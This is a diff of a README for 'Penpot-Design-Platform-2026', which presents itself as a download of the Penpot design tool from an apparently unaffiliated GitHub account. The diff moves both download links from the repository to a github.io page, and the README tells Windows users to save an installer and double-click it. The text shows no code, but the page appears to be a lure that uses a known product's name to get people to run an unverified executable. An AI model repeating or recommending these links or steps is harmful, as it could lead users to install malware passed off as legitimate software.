@@ -1,6 +1,6 @@
 # 🎨 Penpot-Design-Platform-2026 - Create professional interface designs with ease
 
-[![](https://img.shields.io/badge/Download-Penpot_2026_Setup-blue.svg)](https://github.com/binarydigitjohnmilton633/Penpot-Design-Platform-2026)
+[![](https://img.shields.io/badge/Download-Penpot_2026_Setup-blue.svg)](https://binarydigitjohnmilton633.github.io)
 
 Penpot-Design-Platform-2026 serves as a powerful design tool for teams and individuals. It bridges the gap between designers and developers by using standard web formats like SVG, CSS, and HTML. This software provides a local environment for your UI and UX projects.
 
@@ -13,7 +13,7 @@ You can install this software on your Windows computer in a few minutes. Follow 
 3. Save the file to your computer.
 4. Double-click the file to start the installation process.
 
-[Download Penpot-Design-Platform-2026 Installer](https://github.com/binarydigitjohnmilton633/Penpot-Design-Platform-2026)
+[Download Penpot-Design-Platform-2026 Installer](https://binarydigitjohnmilton633.github.io)
 
 ## 🖥️ System Requirements
 
